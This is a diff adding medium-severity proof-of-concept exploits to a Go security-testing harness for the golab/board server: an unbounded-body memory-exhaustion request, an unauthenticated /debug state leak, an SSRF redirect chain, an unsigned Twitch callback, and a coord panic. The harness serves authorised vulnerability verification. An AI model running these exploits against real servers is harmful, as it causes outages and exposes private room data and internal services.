@@ -1,5 +1,5 @@
-// Command poc is a proof-of-concept harness for the Critical and High findings
-// in ../../../SECURITY_ASSESSMENT.md.
+// Command poc is a proof-of-concept harness for the Critical, High, and Medium
+// findings in ../../../SECURITY_ASSESSMENT.md (plus the second-pass a1/b1).
 //
 // It is intended to be run ONLY against a local, disposable test instance of
 // golab/board that you own and are authorised to test. Several PoCs crash or
@@ -10,7 +10,7 @@
 //
 //	go run ./security/poc/harness <finding-id> [flags]
 //
-// Finding IDs: c1 c2 c3 c4 c5 c6 c7 h1 h2 h3 h4 h5 h6 h7
+// Finding IDs: c1 c2 c3 c4 c5 c6 c7 h1 h2 h3 h4 h5 h6 h7 m2 m3 m4 m5 m7 a1 b1
 // Run with no arguments for the full list.
 package main
 
@@ -20,6 +20,7 @@ import (
 	"encoding/binary"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -30,6 +31,7 @@ import (
 
 	stdzip "archive/zip"
 
+	"github.com/golab/board/internal/fetch"
 	izip "github.com/golab/board/internal/zip"
 	"github.com/golab/board/pkg/core/board"
 	"github.com/golab/board/pkg/core/color"
@@ -532,6 +534,143 @@ func pocH7() {
 }
 
 // =========================================================================
+// MEDIUM (verification PoCs)
+// =========================================================================
+
+// M-2: unbounded HTTP request body (io.ReadAll(r.Body), no MaxBytesReader).
+func pocM2() {
+	banner("m2", "Unbounded HTTP request body (io.ReadAll, no cap)")
+	requireTarget()
+	before := serverAlive()
+	const n = 40 << 20 // 40 MiB body
+	fmt.Printf("POST /api/v1/room/poc-m2 with a %d MiB body (server io.ReadAll's it entirely)\n", n>>20)
+	// stream a big body; the JSON is invalid but the server buffers it all first
+	body := io.MultiReader(strings.NewReader(`{"event":"ping","value":"`),
+		io.LimitReader(zeroReader{}, n), strings.NewReader(`"}`))
+	req, _ := http.NewRequest("POST", "http://"+target+"/api/v1/room/poc-m2", body)
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := (&http.Client{Timeout: 30 * time.Second}).Do(req)
+	if err != nil {
+		fmt.Println("request error:", err)
+	} else {
+		_ = resp.Body.Close()
+		fmt.Printf("server accepted and buffered the whole body (status %s)\n", resp.Status)
+	}
+	fmt.Println(">> no per-request size limit; scale up / parallelize to pressure memory.")
+	fmt.Println(">> Behind a reverse proxy this HTTP vector is capped by client_max_body_size; the WS")
+	fmt.Println(">> framing path (C-4) is the uncapped equivalent that a proxy tunnels.")
+	reportCrash(before)
+}
+
+type zeroReader struct{}
+
+func (zeroReader) Read(p []byte) (int, error) {
+	for i := range p {
+		p[i] = 'A'
+	}
+	return len(p), nil
+}
+
+// M-3: /debug leaks full room state with no auth (even password-protected rooms).
+func pocM3() {
+	banner("m3", "/debug leaks full room state unauthenticated")
+	requireTarget()
+	// create/seed a room, then read its debug dump with no credentials
+	_, _ = http.Post("http://"+target+"/api/v1/room/poc-m3", "application/json",
+		strings.NewReader(event("ping", `""`)))
+	resp, err := http.Get("http://" + target + "/b/poc-m3/debug")
+	if err != nil {
+		fmt.Println("request error:", err)
+		return
+	}
+	b, _ := io.ReadAll(resp.Body)
+	_ = resp.Body.Close()
+	fmt.Printf("GET /b/poc-m3/debug -> %s\n%s\n", resp.Status, strings.TrimSpace(string(b)))
+	fmt.Println(">> full StateJSON (SGF, location, prefs) of ANY room, no password required.")
+	fmt.Println(">> Behind a proxy this is still reachable (normal GET); works on password rooms too.")
+}
+
+// M-4: SSRF — the fetch client follows redirects to arbitrary hosts, no timeout.
+// Self-contained: an "approved-looking" server 302-redirects to an "internal"
+// server; DefaultFetcher.Fetch follows it and returns the internal content.
+func pocM4() {
+	banner("m4", "SSRF: fetch follows cross-host redirects with no timeout")
+	// "internal" service (stands in for a cluster-internal svc or 169.254.169.254)
+	internalMux := http.NewServeMux()
+	internalMux.HandleFunc("/secret", func(w http.ResponseWriter, r *http.Request) {
+		_, _ = w.Write([]byte("INTERNAL-ONLY-SECRET (e.g. k8s service / cloud metadata)"))
+	})
+	internal := &http.Server{Handler: internalMux}
+	il, _ := net.Listen("tcp", "127.0.0.1:0")
+	go internal.Serve(il)  //nolint:errcheck
+	defer internal.Close() //nolint:errcheck
+	internalURL := "http://" + il.Addr().String() + "/secret"
+
+	// "approved" edge that open-redirects to the internal target
+	edgeMux := http.NewServeMux()
+	edgeMux.HandleFunc("/redirect", func(w http.ResponseWriter, r *http.Request) {
+		http.Redirect(w, r, internalURL, http.StatusFound)
+	})
+	edge := &http.Server{Handler: edgeMux}
+	el, _ := net.Listen("tcp", "127.0.0.1:0")
+	go edge.Serve(el)  //nolint:errcheck
+	defer edge.Close() //nolint:errcheck
+	edgeURL := "http://" + el.Addr().String() + "/redirect"
+
+	fmt.Printf("fetching %s (which 302-redirects to the internal %s)\n", edgeURL, internalURL)
+	got, err := fetch.NewDefaultFetcher(nil).Fetch(edgeURL)
+	if err != nil {
+		fmt.Println("fetch error:", err)
+		return
+	}
+	fmt.Printf(">> Fetch followed the redirect and returned: %q\n", got)
+	fmt.Println(">> internal/fetch uses http.DefaultClient: follows redirects, re-validates NO host, NO timeout.")
+	fmt.Println(">> Reachability: ApprovedFetch checks only the FIRST hop's hostname; an open-redirect on any")
+	fmt.Println(">> approved host (or the OGSCheckEnded/FetchOGS direct-Fetch paths) pivots server-side requests.")
+	fmt.Println(">> In Kubernetes the impact is high: cluster-internal services and cloud metadata become reachable.")
+}
+
+// M-5: Twitch challenge echoed BEFORE signature verification.
+func pocM5() {
+	banner("m5", "Twitch challenge echoed before signature verification")
+	requireTarget()
+	body := `{"challenge":"UNAUTH-ECHO-` + "reflected-value" + `"}`
+	req, _ := http.NewRequest("POST", "http://"+target+"/apps/twitch/callback", strings.NewReader(body))
+	req.Header.Set("Content-Type", "application/json")
+	// deliberately NO valid signature
+	resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(req)
+	if err != nil {
+		fmt.Println("request error:", err)
+		return
+	}
+	b, _ := io.ReadAll(resp.Body)
+	_ = resp.Body.Close()
+	fmt.Printf("POST /apps/twitch/callback {\"challenge\":...} (no signature) -> %s, body=%q\n",
+		resp.Status, strings.TrimSpace(string(b)))
+	fmt.Println(">> the challenge is reflected with no HMAC check -> any party can auto-confirm subscriptions.")
+}
+
+// M-7: coord/board out-of-range panic reachable in the REQUEST path (recovered).
+// Same defect family as P2-A1 but shown via coord.FromInterface, which panics on
+// a non-numeric array element (command_decoder uses it on client JSON).
+func pocM7() {
+	banner("m7", "coord/board out-of-range panics (request path = recovered; same defect as A1)")
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				fmt.Printf(">> coord.FromInterface PANIC: %v\n", r)
+				fmt.Println(">> reached from command_decoder on a crafted board command (e.g. goto_coord/label).")
+				fmt.Println(">> In the request goroutine this is RECOVERED (per-connection). Guard it anyway:")
+				fmt.Println(">> the identical unguarded coord/Board.Set code is FATAL via the OGS goroutine (A1).")
+			}
+		}()
+		// a coords array whose element is a string, not a number
+		_, _ = coord.FromInterface([]any{"x", "y"})
+		fmt.Println("no panic (unexpected)")
+	}()
+}
+
+// =========================================================================
 // SECOND PASS (new findings) — see SECURITY_ASSESSMENT.md §10
 // =========================================================================
 
@@ -662,6 +801,11 @@ var pocs = []struct {
 	{"h7", "Tree toSGF stack overflow (CONFIRMED whole-server crash, elevated to Critical)", pocH7},
 	{"b1", "[pass2] Colon-less LB label poison-pill — unrecoverable board (CONFIRMED)", pocB1},
 	{"a1", "[pass2] Board.Set nil/OOB via OGS goroutine — whole-server crash (CONFIRMED)", pocA1},
+	{"m2", "[medium] Unbounded HTTP request body", pocM2},
+	{"m3", "[medium] /debug leaks room state unauthenticated (CONFIRMED)", pocM3},
+	{"m4", "[medium] SSRF: fetch follows redirects, no timeout (CONFIRMED)", pocM4},
+	{"m5", "[medium] Twitch challenge echoed before verify (CONFIRMED)", pocM5},
+	{"m7", "[medium] coord/board OOB panic — recovered in request path (CONFIRMED)", pocM7},
 }
 
 func usage() {
@@ -671,8 +815,8 @@ func usage() {
 	for _, p := range pocs {
 		fmt.Printf("  %-4s %s\n", p.id, p.title)
 	}
-	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1  (h6 verifies a mitigation)")
-	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5")
+	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 m4 m7  (h6 verifies a mitigation)")
+	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5 m2 m3 m5")
 	fmt.Println("b1 also runs e2e when -target is given (uploads the poison, then you join to brick it)")
 	fmt.Println("\nWARNING: several PoCs crash or exhaust the target. Authorised local testing only.")
 }
